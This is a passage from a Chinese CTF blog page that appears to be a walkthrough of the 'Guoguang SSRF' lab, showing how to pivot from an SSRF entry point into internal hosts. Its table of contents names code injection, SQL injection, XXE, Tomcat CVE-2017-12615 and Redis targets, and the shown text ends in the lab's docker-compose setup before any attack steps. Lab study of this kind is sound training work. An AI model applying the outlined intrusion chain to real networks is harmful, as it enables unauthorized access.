<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>国光SSRF靶场打穿内网 | the0n3</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/favicon.ico">
    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
    <link rel="stylesheet" href="/codeStyle/styles/github-dark.min.css">
    <script src="/codeStyle/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <meta name="description" content="CTF学习过程记录、随写、分享">
    <meta name="keywords" content="ctf,web,php,sql注入,xss,文件上传,文件包含,反序列化,代码审计,ssti模板注入,命令执行,框架复现,漏洞复现,渗透测试,内网,域,提权,网络安全,安全工具,漏洞分析,安全博客">
    <meta name="author" content="the0n3">
    <meta name="theme-color" content="#11a8cd">
    <meta name="google-site-verification" content="2rTU4TJf9FGp-0dfoTNgDPqEaVmD1mMxR_aabNaQXnQ">
    
    <link rel="preload" href="/assets/css/0.styles.3377293b.css" as="style"><link rel="preload" href="/assets/js/app.285d429f.js" as="script"><link rel="preload" href="/assets/js/2.a5a506a3.js" as="script"><link rel="preload" href="/assets/js/27.32b48f50.js" as="script"><link rel="prefetch" href="/assets/js/10.1677bf54.js"><link rel="prefetch" href="/assets/js/100.c173ea67.js"><link rel="prefetch" href="/assets/js/101.a4085283.js"><link rel="prefetch" href="/assets/js/102.f45264ea.js"><link rel="prefetch" href="/assets/js/103.c9e63653.js"><link rel="prefetch" href="/assets/js/104.286ef205.js"><link rel="prefetch" href="/assets/js/105.c2a924ab.js"><link rel="prefetch" href="/assets/js/106.29823688.js"><link rel="prefetch" href="/assets/js/107.71d96805.js"><link rel="prefetch" href="/assets/js/108.75b0b246.js"><link rel="prefetch" href="/assets/js/109.888e501c.js"><link rel="prefetch" href="/assets/js/11.bea09cb3.js"><link rel="prefetch" href="/assets/js/110.3fbcba97.js"><link rel="prefetch" href="/assets/js/111.cd569896.js"><link rel="prefetch" href="/assets/js/112.1ca60121.js"><link rel="prefetch" href="/assets/js/113.7258b830.js"><link rel="prefetch" href="/assets/js/114.b6cf969d.js"><link rel="prefetch" href="/assets/js/115.d21a2ef9.js"><link rel="prefetch" href="/assets/js/116.3cea2514.js"><link rel="prefetch" href="/assets/js/117.aa5562e7.js"><link rel="prefetch" href="/assets/js/118.1835be45.js"><link rel="prefetch" href="/assets/js/119.4bb958e3.js"><link rel="prefetch" href="/assets/js/12.b73dcc2a.js"><link rel="prefetch" href="/assets/js/120.e732f0d9.js"><link rel="prefetch" href="/assets/js/121.2c944cb0.js"><link rel="prefetch" href="/assets/js/122.05267a6d.js"><link rel="prefetch" href="/assets/js/123.cb1491de.js"><link rel="prefetch" href="/assets/js/124.347a8e3b.js"><link rel="prefetch" href="/assets/js/125.695c8ef3.js"><link rel="prefetch" href="/assets/js/126.4c5cabea.js"><link rel="prefetch" href="/assets/js/127.c6be8252.js"><link rel="prefetch" href="/assets/js/128.4816dbe8.js"><link rel="prefetch" href="/assets/js/129.258e57d2.js"><link rel="prefetch" href="/assets/js/13.28172379.js"><link rel="prefetch" href="/assets/js/130.d6bb4337.js"><link rel="prefetch" href="/assets/js/131.0559bb7a.js"><link rel="prefetch" href="/assets/js/132.63aa19a3.js"><link rel="prefetch" href="/assets/js/133.38988449.js"><link rel="prefetch" href="/assets/js/134.d4f64072.js"><link rel="prefetch" href="/assets/js/135.384e3a88.js"><link rel="prefetch" href="/assets/js/136.a40d5382.js"><link rel="prefetch" href="/assets/js/137.1f2921ba.js"><link rel="prefetch" href="/assets/js/138.cac3c26c.js"><link rel="prefetch" href="/assets/js/139.f3dd4ff7.js"><link rel="prefetch" href="/assets/js/14.809938db.js"><link rel="prefetch" href="/assets/js/140.ac8f19f3.js"><link rel="prefetch" href="/assets/js/141.b475b167.js"><link rel="prefetch" href="/assets/js/142.eece7e4a.js"><link rel="prefetch" href="/assets/js/143.e17f8464.js"><link rel="prefetch" href="/assets/js/144.5b75cbb2.js"><link rel="prefetch" href="/assets/js/145.d3ada4d5.js"><link rel="prefetch" href="/assets/js/146.b17d393c.js"><link rel="prefetch" href="/assets/js/147.4b06a880.js"><link rel="prefetch" href="/assets/js/148.1490f81c.js"><link rel="prefetch" href="/assets/js/149.5e432370.js"><link rel="prefetch" href="/assets/js/15.0f374e84.js"><link rel="prefetch" href="/assets/js/150.e92e9cd0.js"><link rel="prefetch" href="/assets/js/151.f1527aaa.js"><link rel="prefetch" href="/assets/js/16.995c64ee.js"><link rel="prefetch" href="/assets/js/17.ff6b3949.js"><link rel="prefetch" href="/assets/js/18.4c8a0496.js"><link rel="prefetch" href="/assets/js/19.9b2db379.js"><link rel="prefetch" href="/assets/js/20.69d9840e.js"><link rel="prefetch" href="/assets/js/21.92022f10.js"><link rel="prefetch" href="/assets/js/22.9a89cd23.js"><link rel="prefetch" href="/assets/js/23.a978c02e.js"><link rel="prefetch" href="/assets/js/24.b009076a.js"><link rel="prefetch" href="/assets/js/25.64022c42.js"><link rel="prefetch" href="/assets/js/26.bda9ec1e.js"><link rel="prefetch" href="/assets/js/28.068ecc29.js"><link rel="prefetch" href="/assets/js/29.ccb0cf08.js"><link rel="prefetch" href="/assets/js/3.c32e4f80.js"><link rel="prefetch" href="/assets/js/30.73f4be87.js"><link rel="prefetch" href="/assets/js/31.592b8fc0.js"><link rel="prefetch" href="/assets/js/32.3ed847b1.js"><link rel="prefetch" href="/assets/js/33.64ebc433.js"><link rel="prefetch" href="/assets/js/34.b71c9ce9.js"><link rel="prefetch" href="/assets/js/35.441d3d90.js"><link rel="prefetch" href="/assets/js/36.879d5ae6.js"><link rel="prefetch" href="/assets/js/37.161ab31c.js"><link rel="prefetch" href="/assets/js/38.297037a7.js"><link rel="prefetch" href="/assets/js/39.bc42a41f.js"><link rel="prefetch" href="/assets/js/4.16da1e3f.js"><link rel="prefetch" href="/assets/js/40.90de51af.js"><link rel="prefetch" href="/assets/js/41.d0dd74b9.js"><link rel="prefetch" href="/assets/js/42.b88c5800.js"><link rel="prefetch" href="/assets/js/43.bdb722dc.js"><link rel="prefetch" href="/assets/js/44.6699c1d3.js"><link rel="prefetch" href="/assets/js/45.31cdedbe.js"><link rel="prefetch" href="/assets/js/46.cf21b80f.js"><link rel="prefetch" href="/assets/js/47.e8b5463f.js"><link rel="prefetch" href="/assets/js/48.362ab944.js"><link rel="prefetch" href="/assets/js/49.f23911ba.js"><link rel="prefetch" href="/assets/js/5.158a8075.js"><link rel="prefetch" href="/assets/js/50.e85f4903.js"><link rel="prefetch" href="/assets/js/51.17d2b177.js"><link rel="prefetch" href="/assets/js/52.6a167681.js"><link rel="prefetch" href="/assets/js/53.d2cf3520.js"><link rel="prefetch" href="/assets/js/54.f4faf5e8.js"><link rel="prefetch" href="/assets/js/55.f8202248.js"><link rel="prefetch" href="/assets/js/56.fb159c87.js"><link rel="prefetch" href="/assets/js/57.a69fb358.js"><link rel="prefetch" href="/assets/js/58.b455ce4a.js"><link rel="prefetch" href="/assets/js/59.0c6d4f93.js"><link rel="prefetch" href="/assets/js/6.c0b59a2d.js"><link rel="prefetch" href="/assets/js/60.62f3e9f7.js"><link rel="prefetch" href="/assets/js/61.0d361fcc.js"><link rel="prefetch" href="/assets/js/62.9af99bb9.js"><link rel="prefetch" href="/assets/js/63.305c027b.js"><link rel="prefetch" href="/assets/js/64.8b6e0094.js"><link rel="prefetch" href="/assets/js/65.60285055.js"><link rel="prefetch" href="/assets/js/66.8226a929.js"><link rel="prefetch" href="/assets/js/67.6634202c.js"><link rel="prefetch" href="/assets/js/68.3dd459a0.js"><link rel="prefetch" href="/assets/js/69.c9c89f89.js"><link rel="prefetch" href="/assets/js/7.cc91f7df.js"><link rel="prefetch" href="/assets/js/70.6bd33cf0.js"><link rel="prefetch" href="/assets/js/71.4b70ed6c.js"><link rel="prefetch" href="/assets/js/72.0126e16c.js"><link rel="prefetch" href="/assets/js/73.b073da53.js"><link rel="prefetch" href="/assets/js/74.604785c2.js"><link rel="prefetch" href="/assets/js/75.6f9cce59.js"><link rel="prefetch" href="/assets/js/76.6aa42e23.js"><link rel="prefetch" href="/assets/js/77.fc1334d8.js"><link rel="prefetch" href="/assets/js/78.ad18a85c.js"><link rel="prefetch" href="/assets/js/79.a8a0885e.js"><link rel="prefetch" href="/assets/js/8.cf6c7f34.js"><link rel="prefetch" href="/assets/js/80.a3394512.js"><link rel="prefetch" href="/assets/js/81.bfaaff8b.js"><link rel="prefetch" href="/assets/js/82.82d971e0.js"><link rel="prefetch" href="/assets/js/83.8b8eef05.js"><link rel="prefetch" href="/assets/js/84.a5967ed8.js"><link rel="prefetch" href="/assets/js/85.98db884a.js"><link rel="prefetch" href="/assets/js/86.fc7fcb00.js"><link rel="prefetch" href="/assets/js/87.fbc2baba.js"><link rel="prefetch" href="/assets/js/88.3e356a1f.js"><link rel="prefetch" href="/assets/js/89.b9e1b5c4.js"><link rel="prefetch" href="/assets/js/9.7d02f968.js"><link rel="prefetch" href="/assets/js/90.98c37c1f.js"><link rel="prefetch" href="/assets/js/91.e56675fd.js"><link rel="prefetch" href="/assets/js/92.15b39570.js"><link rel="prefetch" href="/assets/js/93.a1e1d219.js"><link rel="prefetch" href="/assets/js/94.a3b880d9.js"><link rel="prefetch" href="/assets/js/95.95117546.js"><link rel="prefetch" href="/assets/js/96.42facbf7.js"><link rel="prefetch" href="/assets/js/97.0fcf368b.js"><link rel="prefetch" href="/assets/js/98.6394207a.js"><link rel="prefetch" href="/assets/js/99.04dcfcc8.js">
    <link rel="stylesheet" href="/assets/css/0.styles.3377293b.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="the0n3" class="logo"> <span class="site-name can-hide">the0n3</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/ggssrf/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><!----> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/ggssrf/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/a14a27/" class="sidebar-link">xyctf</a></li><li><a href="/pages/3dab5b/" class="sidebar-link">CTFSHOW web311-314 CVE-wtiteup</a></li><li><a href="/pages/06f28c/" class="sidebar-link">CTFshow 文件上传web151-170</a></li><li><a href="/pages/a11a87/" class="sidebar-link">CTFSHOW nodejs 334-338</a></li><li><a href="/pages/e9d443/" class="sidebar-link">ctfshow web sql注入171-253</a></li><li><a href="/pages/0aec60/" class="sidebar-link">pwnable</a></li><li><a href="/pages/a0e9c3/" class="sidebar-link">BaseCTF 2024 web部分wp</a></li><li><a href="/pages/969484/" class="sidebar-link">buu 部分flask题目</a></li><li><a href="/pages/113a46/" class="sidebar-link">MoeCTF 2024 wp</a></li><li><a href="/pages/24d392/" class="sidebar-link">buu一道简单java web</a></li><li><a href="/pages/286e6c/" class="sidebar-link">ctfshow RCE极限挑战</a></li><li><a href="/pages/a43171/" class="sidebar-link">ctfshow 常见姿势</a></li><li><a href="/pages/8a601d/" class="sidebar-link">buildCTF web wp</a></li><li><a href="/pages/e5ee7e/" class="sidebar-link">ctfshow单身杯</a></li><li><a href="/pages/c883f6/" class="sidebar-link">ctfshow-thinkphp专题</a></li><li><a href="/pages/a0b4dd/" class="sidebar-link">玄机-webshell查杀</a></li><li><a href="/pages/b93d32/" class="sidebar-link">蜀道山高校联合赛</a></li><li><a href="/pages/fff859/" class="sidebar-link">应急响应-linux日志分析</a></li><li><a href="/pages/0e353f/" class="sidebar-link">ciscn2023 web部分</a></li><li><a href="/pages/29c781/" class="sidebar-link">应急响应-linux入侵排查</a></li><li><a href="/pages/02e0b4/" class="sidebar-link">应急响应-apahce日志分析</a></li><li><a href="/pages/ggssrf/" aria-current="page" class="active sidebar-link">国光SSRF靶场打穿内网</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#前言" class="sidebar-link">前言</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#环境部署" class="sidebar-link">环境部署</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#入口点-http-192-168-245-140-8090" class="sidebar-link">入口点 http://192.168.245.140:8090/</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-22-80-代码注入" class="sidebar-link">192.168.100.22:80 代码注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-23-80-sql注入" class="sidebar-link">192.168.100.23:80 SQL注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-24-80-命令执行" class="sidebar-link">192.168.100.24:80 命令执行</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-25-80-xxe" class="sidebar-link">192.168.100.25:80   XXE</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-26-8080-tomcat-8-5-19-cve-2017-12615" class="sidebar-link">192.168.100.26:8080 Tomcat/8.5.19 CVE-2017-12615</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-27-6379-redis未授权" class="sidebar-link">192.168.100.27:6379 Redis未授权</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-28-6379-redis密码认证" class="sidebar-link">192.168.100.28:6379 Redis密码认证</a></li><li class="sidebar-sub-header level2"><a href="/pages/ggssrf/#_192-168-100-29-3306-有密码认证mysql" class="sidebar-link">192.168.100.29:3306 有密码认证mysql</a></li></ul></li><li><a href="/pages/actf2025/" class="sidebar-link">ACTF2025 web部分题解</a></li><li><a href="/pages/ctfshow-websec/" class="sidebar-link">CTFshow web应用安全与防护 wp</a></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><span data-v-06225672>wp</span></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://the0n3.top" target="_blank" title="作者" class="beLink" data-v-06225672>the0n3</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2025-04-16</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">国光SSRF靶场打穿内网<!----></h1>  <div class="theme-vdoing-content content__default"><h2 id="前言"><a href="#前言" class="header-anchor">#</a> 前言</h2> <p>很久前在b站up橙子科技看到过这个靶场，看到<a href="https://baozongwi.xyz/" target="_blank" rel="noopener noreferrer">baozongwi<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>师傅博客更新了wp，太棒了，跟着复现一遍</p> <p>拓扑</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/1.png" alt="1"></p> <h2 id="环境部署"><a href="#环境部署" class="header-anchor">#</a> 环境部署</h2> <p>docker-compose.yml</p> <div class="language-yaml line-numbers-mode"><pre class="language-yaml"><code><span class="token key atrule">networks</span><span class="token punctuation">:</span>
  <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
    <span class="token key atrule">ipam</span><span class="token punctuation">:</span>
      <span class="token key atrule">config</span><span class="token punctuation">:</span>
        <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 192.168.100.0/24  <span class="token comment"># 改为 192.168.100.0/24，避免冲突</span>
          <span class="token key atrule">gateway</span><span class="token punctuation">:</span> 192.168.100.1

<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">ssrfweb1</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_web<span class="token punctuation">:</span>v1
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
    <span class="token punctuation">-</span> 8090<span class="token punctuation">:</span><span class="token number">80</span>
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.21

  <span class="token key atrule">ssrfweb2</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_codesec<span class="token punctuation">:</span>v2
    <span class="token key atrule">networks</span><span class="token punctuation">:</span>
      <span class="token key atrule">ssrf_v</span><span class="token punctuation">:</span>
        <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 192.168.100.22

  <span class="token key atrule">ssrfweb3</span><span class="token punctuation">:</span>
    <span class="token key atrule">image</span><span class="token punctuation">:</span> selectarget/ssrf_sql<span class="token punctuation">:</span>v3
